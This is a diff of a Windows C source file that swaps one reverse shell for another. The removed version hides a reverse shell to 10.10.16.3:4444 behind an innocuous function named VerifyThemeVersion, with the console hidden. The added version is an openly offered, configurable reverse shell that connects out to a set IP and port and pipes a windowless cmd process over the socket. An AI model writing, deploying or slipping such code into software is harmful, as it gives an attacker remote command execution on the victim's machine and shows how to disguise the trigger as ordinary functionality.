@@ -1,52 +1,60 @@
-#include "pch.h"
-#include <stdio.h>
-#include <string.h>
-#include <process.h>
 #include <winsock2.h>
-#include <ws2tcpip.h>
+#include <windows.h>
+#include <io.h>
+#include <process.h>
+#include <sys/types.h>
+#include <stdio.h>
 #include <stdlib.h>
-#pragma comment(lib, "Ws2_32.lib")
-#include "rev.h"
-using namespace std;
+#include <string.h>
 
-void rev_shell()
-{
-	FreeConsole();
+/* ================================================== */
+/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
+/* ================================================== */
+#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
+# define CLIENT_IP (char*)"0.0.0.0"
+# define CLIENT_PORT (int)0
+#endif
+/* ================================================== */
 
-	const char* REMOTE_ADDR = "10.10.16.3";
-	const char* REMOTE_PORT = "4444";
+int main(void) {
+	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
+		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
+		return (1);
+	}
 
 	WSADATA wsaData;
-	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	struct addrinfo* result = NULL, * ptr = NULL, hints;
-	memset(&hints, 0, sizeof(hints));
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
-	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
-	ptr = result;
-	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
-	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	si.hStdInput = (HANDLE)ConnectSocket;
-	si.hStdOutput = (HANDLE)ConnectSocket;
-	si.hStdError = (HANDLE)ConnectSocket;
-	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
-	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-	WaitForSingleObject(pi.hProcess, INFINITE);
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
-	WSACleanup();
-}
+	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		return (1);
+	}
 
-int VerifyThemeVersion(void)
-{
-	rev_shell();
-	return 0;
+	int port = CLIENT_PORT;
+	struct sockaddr_in sa;
+	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
+
+#ifdef WAIT_FOR_CLIENT
+	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		Sleep(5000);
+	}
+#else
+	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		write(2, "[ERROR] connect failed.\n", 24);
+		return (1);
+	}
+#endif
+
+	STARTUPINFO sinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sockt;
+	sinfo.hStdOutput = (HANDLE)sockt;
+	sinfo.hStdError = (HANDLE)sockt;
+	PROCESS_INFORMATION pinfo;
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+
+	return (0);
 }
